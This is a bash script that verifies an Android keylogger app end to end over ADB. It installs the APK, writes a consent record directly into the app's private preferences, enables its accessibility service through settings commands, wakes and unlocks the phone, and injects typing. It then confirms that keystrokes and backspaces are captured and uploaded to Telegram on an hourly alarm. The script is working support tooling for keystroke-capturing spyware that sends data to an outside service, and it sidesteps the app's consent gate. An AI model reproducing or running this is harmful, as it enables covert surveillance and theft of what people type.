#!/usr/bin/env bash
# End-to-end verification of the on-device upload pipeline over ADB.
#
# Proves, against real hardware, that:
#   - the accessibility service binds
#   - text deltas are captured without re-dumping the whole field
#   - the backspace marker is written
#   - rotate + sendDocument reaches Telegram (HTTP 2xx) and the outbox drains
#
# Usage:
#   tools/device-retest.sh [ip:port]
#
# Env overrides:
#   APK    path to the APK to install (default: the debug build output)
#   LOG    log file (default: /tmp/opencode/device-retest.log)
#   UPLOAD 1 to also assert rotate+sendDocument. Requires a destination
#          already configured in the app (Settings). Default 0: capture-only.
#
# v3.0 note: capture is consent-gated, so this script seeds a consent record
# into the app's private prefs before starting the service. The APK must be
# debuggable (run-as) for that step; the debug build is.
#
# Exit codes: 0 all checks passed, 1 a check failed or no device, 2 usage.
set -euo pipefail
IFS=$'\n\t'

REPO_ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
ADDR=${1:-}
APK=${APK:-$REPO_ROOT/AndroidKeylogger/app/build/outputs/apk/debug/app-debug.apk}
LOG=${LOG:-/tmp/opencode/device-retest.log}

PKG=com.bshu2.androidkeylogger
SVC=$PKG/$PKG.KeyloggerService
FILES=/sdcard/Android/data/$PKG/files
ARCHIVE=$FILES/keylog_$(date +%Y%m%d).txt
UPLOAD=${UPLOAD:-0}
# Upload cadence of the APK under test, in ms. Override when testing a fast
# build: INTERVAL_MS=60000 ALARM_WAIT=1 ./tools/device-retest.sh
INTERVAL_MS=${INTERVAL_MS:-3600000}
PULLED=$(mktemp -t keylog-pull.XXXXXX)
trap 'rm -f "$PULLED"' EXIT

log() { printf '%s\n' "$*" | tee -a "$LOG"; }
a() { adb "$@" 2>&1 | tee -a "$LOG" || true; }
r() { adb shell "$@" 2>&1 | tee -a "$LOG" || true; }

mkdir -p -- "$(dirname -- "$LOG")"
: >"$LOG"
log "== retest start $(date -Is) target=${ADDR:-auto} =="

if [[ ! -f $APK ]]; then
    log "FATAL: APK not found: $APK"
    exit 2
fi

if [[ -z $ADDR ]]; then
    ADDR=$(adb devices | awk 'NR>1 && $2=="device" {print $1; exit}')
fi
if [[ -z $ADDR ]]; then
    log "FATAL: no device attached; pass ip:port"
    exit 1
fi
if ! adb devices | awk -v a="$ADDR" 'NR>1 && $1==a && $2=="device" {f=1} END {exit !f}'; then
    log "FATAL: $ADDR is not in 'device' state"
    adb devices | tee -a "$LOG"
    exit 1
fi
log "-- target $ADDR confirmed"

log "-- install $APK"
# v3.0 is signed differently from v2.x, so an in-place upgrade fails. Uninstall
# first on mismatch; this wipes prior logs, which is fine for a test device.
if ! adb install -r "$APK" 2>&1 | tee -a "$LOG" | tail -2; then
    log "   install -r failed, retrying after uninstall"
    a uninstall "$PKG" >/dev/null 2>&1 || true
    if ! a install "$APK" | tail -2; then
        log "FATAL: install failed"
        exit 1
    fi
fi

log "-- seed consent (v3.0 has no bypass; capture is off without this)"
# run-as works only for debuggable builds, which the debug APK is. The record is
# written by pushing a real file and copying it in place: nesting printf inside
# `adb shell sh -c` mangles the quotes, and run-as does not guarantee a cwd.
# This mirrors Prefs.grantConsent() exactly: file "keylogger", consent_version 1,
# capture_enabled true.
CONSENT=$(mktemp -t consent.XXXXXX)
printf '%s\n' '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>' \
    '<map>' \
    '    <int name="consent_version" value="1" />' \
    '    <boolean name="capture_enabled" value="true" />' \
    '</map>' >"$CONSENT"
a push "$CONSENT" /data/local/tmp/consent.xml >/dev/null
r run-as "$PKG" mkdir -p shared_prefs
r run-as "$PKG" cp /data/local/tmp/consent.xml shared_prefs/keylogger.xml
r run-as "$PKG" chmod 660 shared_prefs/keylogger.xml
r run-as "$PKG" cat shared_prefs/keylogger.xml
r rm -f /data/local/tmp/consent.xml
rm -f "$CONSENT"

log "-- wake/unlock"
r input keyevent KEYCODE_WAKEUP
sleep 1
r wm dismiss-keyguard
sleep 1
r input swipe 540 1800 540 600 200
sleep 2
r dumpsys power | grep -m1 'mWakefulness='

log "-- enable service (force a real null -> set rebind)"
adb logcat -c >/dev/null 2>&1 || true
# Writing the SAME value back is a no-op: AccessibilityManagerService skips
# unchanged settings and the service is never unbound/rebound. Clear it first
# so the following write is a real transition and onServiceConnected() runs.
r settings put secure enabled_accessibility_services '""'
sleep 2
r settings put secure enabled_accessibility_services "$SVC"
r settings put secure accessibility_enabled 1
sleep 6
# 'Bound services' lists enabled packages even when nothing is connected, so it
# cannot prove a live service. 'Starting service' is logged by
# onServiceConnected() and is the real signal.
echo "Starting service lines: $(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)"

log "-- capture: delta dedupe + backspace marker"
# Messaging's composer is not usable for this on MIUI: `uiautomator` is what
# reveals its bounds but running it kills the accessibility service, and once
# it is killed a same-value `enabled_accessibility_services` write is a no-op,
# so the service never rebinds and no TEXT event is produced. Verified on the
# Redmi Note 4: mServedView=null, zero writes.
#
# Use the app's own Settings screen instead. Its bounds are fixed and known, so
# no dump is needed, and the service stays bound for the whole capture.
r am start -n "$PKG/.MainActivity"
sleep 4
r input tap 540 1370          # SETTINGS button center on 1080x1920
sleep 3
r dumpsys window | grep -m1 mCurrentFocus
# Tap the bot token EditText. Bounds [63,147][1017,265] -> center (540, 206).
r input tap 540 206
sleep 2
# The field keeps its value across runs. Typing into a non-empty field makes
# the delta logic (correctly) log only the suffix, which breaks the assertions
# below. Empty it first: MOVE_END, then enough DELs for anything left over.
r input keyevent KEYCODE_MOVE_END
# `input keyevent` accepts several keycodes in one call. 67 is KEYCODE_DEL.
r input keyevent 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67
r input keyevent 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67
r input keyevent 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67
r input keyevent 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67
sleep 2
r input text 'retestalpha'
sleep 3
r input text 'retestbeta'
sleep 3
r input keyevent KEYCODE_DEL
sleep 3

log "-- archive tail"
r tail -8 "$ARCHIVE"

log "-- force rotate"
# Rebind the service so onServiceConnected() rotates pending.txt (and uploads,
# when UPLOAD=1). Writing the SAME value back is a no-op:
# AccessibilityManagerService skips unchanged settings and the service is never
# unbound. accessibility_enabled alone does not force a rebind either. The
# empty value must be quoted INSIDE the remote shell ('... ""'), otherwise adb
# drops the empty argv slot and the write fails; quoting there makes the
# device-side shell pass a real empty arg.
r 'settings put secure enabled_accessibility_services ""'
sleep 3
r settings put secure enabled_accessibility_services "$SVC"
r settings put secure accessibility_enabled 1
sleep 15

log "-- logcat proof"
adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | tail -25 || true

# Optional, ALARM_WAIT=1: prove the durable AlarmManager chain, not just the
# rebind path. Types a marker, then waits out one interval with no interaction
# and checks the alarm broadcast did the rotate+upload itself.
ALARM_FIRED=0
if [ "${ALARM_WAIT:-0}" = "1" ]; then
    log "-- alarm wait (interval + 30s, no interaction)"
    r am start -n com.android.messaging/.ui.conversationlist.ConversationListActivity
    sleep 4
    r input tap 513 1809
    sleep 2
    r input text 'alarmprobe'
    WAIT=$(( (INTERVAL_MS / 1000) + 30 ))
    log "   waiting ${WAIT}s for the alarm"
    sleep "$WAIT"
    ALARM_FIRED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm received' || true)
    adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | grep 'alarm' | tail -5 || true
fi

log "-- outbox (empty after a 2xx upload)"
r ls -l "$FILES/outbox/"

log "-- assertions"
SENT=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'sendDocument ok http=2' || true)
# Failures surface two ways: a non-2xx status ('sendDocument http=4xx') or a
# thrown exception ('sendDocument failed'). Matching only 'sendDocument http='
# silently reported 0 failures during a real UnknownHostException run.
FAILED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -E 'sendDocument (failed|http=[0-9])' | grep -vc 'sendDocument ok http=2' || true)
# `dumpsys accessibility` lists enabled packages even when nothing is bound,
# so it cannot prove a live connection. onServiceConnected() is the only thing
# that rotates and uploads, and it always logs this line.
BOUND=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)
# The alarm is what makes the hourly upload survive doze; without it nothing
# fires on a sleeping phone.
ARMED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm armed in' || true)

DELTA=0; FULL=0; BACK=0
if adb pull "$ARCHIVE" "$PULLED" >/dev/null 2>&1; then
    DELTA=$(grep -c 'retestbeta' "$PULLED" || true)
    FULL=$(grep -c 'retestalpharetestbeta' "$PULLED" || true)
    BACK=$(grep -c '<backspace>' "$PULLED" || true)
else
    log "WARN: could not pull archive for content assertions"
fi

log "service started (expect >0)      : $BOUND"
log "alarm armed (expect >0)          : $ARMED"
log "alarm fired (expect >0 if ALARM_WAIT=1) : $ALARM_FIRED"
log "sendDocument 2xx (expect >0)     : $SENT"
log "sendDocument failures (expect 0) : $FAILED"
log "delta-only line (expect >0)      : $DELTA"
log "full-text re-dump (expect 0)     : $FULL"
log "backspace marker (expect >0)     : $BACK"

STATUS=0
(( BOUND > 0 ))  || { log "FAIL: service not bound"; STATUS=1; }
(( DELTA > 0 ))  || { log "FAIL: no delta line captured"; STATUS=1; }
(( FULL == 0 ))  || { log "FAIL: dedupe re-dumped full text"; STATUS=1; }
(( BACK > 0 ))   || log "WARN: no backspace marker (IME may not report deletes)"
if [ "$UPLOAD" = "1" ]; then
    (( SENT > 0 ))    || { log "FAIL: no 2xx upload"; STATUS=1; }
    (( FAILED == 0 )) || { log "FAIL: upload errors logged"; STATUS=1; }
else
    log "upload assertions skipped (UPLOAD=0)"
fi

log "== retest end $(date -Is) status=$STATUS =="
exit "$STATUS"
